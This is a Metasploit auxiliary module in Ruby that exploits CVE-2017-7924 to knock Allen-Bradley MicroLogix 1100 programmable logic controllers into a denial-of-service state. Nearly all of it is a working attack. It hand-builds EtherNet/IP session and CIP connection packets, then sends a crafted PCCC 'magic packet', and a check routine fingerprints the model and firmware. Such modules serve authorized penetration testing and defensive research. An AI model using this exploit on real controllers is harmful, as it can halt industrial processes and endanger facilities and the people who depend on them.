##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Udp
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(
      'Name'           => "DoS Exploitation of Allen-Bradley's Legacy Protocol (PCCC)",
      'Description'    => %q{
        A remote, unauthenticated attacker could send a single, specially crafted
        Programmable Controller Communication Commands (PCCC) packet to the controller
        that could potentially cause the controller to enter a DoS condition.
        MicroLogix 1100 controllers are affected: 1763-L16BWA, 1763-L16AWA, 1763-L16BBB, and
        1763-L16DWD.
        CVE-2017-7924 has been assigned to this vulnerability.
        A CVSS v3 base score of 7.5 has been assigned.
      },
        'Author'         => [
          'José Diogo Monteiro <jdlopes[at]student.dei.uc.pt>',
          'Luis Rosa <lmrosa[at]dei.uc.pt>',
          'Miguel Borges de Freitas <miguelbf[at]dei.uc.pt>'
      ],
      'License'        => MSF_LICENSE,
      'References'     =>
      [
        [ 'CVE', '2017-7924' ],
        [ 'URL', 'https://ics-cert.us-cert.gov/advisories/ICSA-17-138-03' ],
        [ 'URL', 'http://dl.acm.org/citation.cfm?doid=3174776.3174780']
      ])
      register_options([Opt::RPORT(44818),])
  end

  VULN_LIST = ['1763-L16BWA','1763-L16AWA','1763-L16BBB','1763-L16DWD']
  VULN_FW_VERSION_MIN = 14.00
  VULN_FW_VERSION_MAX = 16.00
  def le_pp(s)
    "0x#{Rex::Text.to_hex(s, prefix="").scan(/../).reverse.join("")}"
  end

  def enip_register_session_pkt
    # ENIP encapsulation Header
    "\x65\x00" + # Command register session (0x0065)
    "\x04\x00" + # Lenght (4)
    "\x00\x00\x00\x00" + # Session handle (0x00000000)
    "\x00\x00\x00\x00" + # Status success (0x00000000)
    "\x00\x00\x00\x00\x00\x00\x00\x00" + # Sender context (0x0000000000000000)
    "\x00\x00\x00\x00" + # Options (0x00000000)
    # Protocol Specific Data
    "\x01\x00" + # Protocol version (1)
    "\x00\x00" # Option flags (0x00000000)
  end

  def enip_ccm_forward_open_pkt(enip_session_handle)
    # ENIP encapsulation header
    "\x6f\x00" + # Send RR data (0x006f)
    "\x3e\x00" + # Lenght (63)
    enip_session_handle + # Session handle (retrieved from register session)
    "\x00\x00\x00\x00" + # Status success (0x00000000)
    "\x00\x00\x00\x00\x00\x00\x00\x00" + # Sender context (0x0000000000000000)
    "\x00\x00\x00\x00" + # Options (0x00000000)
    # Command specific data
    "\x00\x00\x00\x00" + # Interface handle (CIP = 0x00000000)
    "\x00\x00" + # Timeout (0)
    "\x02\x00" + # Item count (2)
    "\x00\x00" + # Item 1 type id (Null address item)
    "\x00\x00" + # Item 1 length (0)
    "\xb2\x00" + # Item 2 type id (Unconnected data item)
    "\x2e\x00" + # Item 2 length (46)
    # CIP Connection manager specific data
    "\x54\x02\x20\x06\x24\x01\x0a\xf0" +
    "\x00\x00\x00\x00\x52\xac\xda\x89" +
    "\x55\x0c\x35\x01\xe1\x08\xb0\x60" +
    "\x07\x00\x00\x00\x00\x40\x00\x00" +
    "\x12\x43\x00\x40\x00\x00\x12\x43" +
    "\xa3\x02\x20\x02\x24\x01"
  end

  # Any combination of File Number 0x02–0x08 and File Type 0x48 or 0x47 will trigger a Major Error (0x08)
  def pccc_dos_pkt(enip_session_id, cip_connection_id)
    # ENIP encapsulation header
    "\x70\x00" + # Send unit data (0x0070)
    "\x2d\x00" + # Length
    enip_session_id + # ENIP session handle (obtained from enip register session)
    "\x00\x00\x00\x00" + # Status Success
    "\x00\x00\x00\x00\x00\x00\x00\x00" + # Sender context
    "\x00\x00\x00\x00" + # Options
    # Command Specific data
    "\x00\x00\x00\x00" + # Interface handle (CIP)
    "\x00\x00" + # Timeout (0)
    "\x02\x00" + # Item count
    "\xa1\x00" + # Item 1 - Type ID (Connected address item)
    "\x04\x00" + # Item 1 - Length (4)
    cip_connection_id + # CIP connection ID (obtained from CIP CM packet)
    "\xb1\x00" + # Item 2 - Type ID (Connected data item)
    "\x19\x00" + # Item 2 - Length (25)
    "\x01\x00" + # Item 2 - CIP Sequence Count (1) - first packet
    # PCCC Command data
    "\x4b" + # Execute PCCC (0x4b)
    "\x02\x20\x67\x24\x01" + # no idea what this is
    "\x07" + # Requestor ID length
    "\x35\x01" + # CIP vendor ID
    "\xe1\x08\xb0\x60" + # CIP serial number
    "\x0f" + # Command code
    "\x00" + # Status (success 0x00)
    "\x2a\x58" + # Transaction code
    "\xa2" + # Function code (Protected typed logical read with three address fields)
    "\x00" + # Byte size
    "\x05" + # File number
    "\x47" + # File type
    "\x00" + # Element number
    "\x00" # Sub-element number
  end

  def enip_list_identify_pkt
    "\x63\x00" + # List Identity
    "\x00\x00" + # Length
    "\x00\x00\x00\x00" + # Session Handle
    "\x00\x00\x00\x00" + # Status: Success
    "\x00\x00" + # Max Response Delay
    "\x00\x00\xc1\xde\xbe\xd1" + # Sender Context
    "\x00\x00\x00\x00" # Options
  end


  def check

    connect_udp

    udp_sock.put(enip_list_identify_pkt)
    res = udp_sock.recvfrom(90)

    disconnect_udp

    unless res && res[0].length > 63 && res[0][0,2] == "\x63\x00"
      print_error "EtherNet/IP Packet Not Valid"
      return Exploit::CheckCode::Unsupported
    end

    revision = res[0][54,2]
    product_name_len = res[0][62].unpack("c*")[0]


    product_name = res[0][63,product_name_len]
    print_status "Product Name: #{product_name}"

    array = product_name.split(' ')
    plc_model = array[0]

    return Exploit::CheckCode::Safe unless VULN_LIST.any? { |e| plc_model.include? e }

    firmware = array[1]
    begin
      firmware_nbr = firmware.scan(/(\d+[.,]\d+)/).flatten.first.to_f
      if firmware_nbr >= VULN_FW_VERSION_MIN && firmware_nbr < VULN_FW_VERSION_MAX
        return Exploit::CheckCode::Vulnerable
      elsif firmware_nbr < VULN_FW_VERSION_MIN
        return Exploit::CheckCode::Appears
      else
        return Exploit::CheckCode::Safe
      end
    rescue
      return Exploit::CheckCode::Unknown
    end

  rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e
    elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
  ensure
    disconnect
  end

  def run
    connect
    # Register Ethernet/IP session
    sock.put(enip_register_session_pkt)
    enip_register_session_ans = sock.get_once
    unless enip_register_session_ans && enip_register_session_ans.length == 28 && enip_register_session_ans[0,2] == "\x65\x00"
      print_error "Ethernet/IP - Failed to create session."
      disconnect
      return
    end
    enip_session_id = enip_register_session_ans[4, 4]
    print_status "Ethernet/IP - Session created (id #{le_pp(enip_session_id)})"

    # Ethernet/IP CCM Forward Open
    sock.put(enip_ccm_forward_open_pkt(enip_session_id))
    enip_ccm_forward_open_ans = sock.get_once
    unless enip_ccm_forward_open_ans && enip_ccm_forward_open_ans.length > 48 && enip_ccm_forward_open_ans[0,2] == "\x6f\x00"
      print_error "CIP Connection Manager - Failed Forward Open request"
      disconnect
      return
    end
    cip_connection_id = enip_ccm_forward_open_ans[44, 4]
    print_status "CIP Connection Manager - Forward Open Success (Connection id #{le_pp(cip_connection_id)})"

    # PCCC DoS packet
    print_status "Sending PCCC DoS magic packet..."
    sock.put(pccc_dos_pkt(enip_session_id, cip_connection_id))

  rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e
    elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
  ensure
    disconnect
  end
end
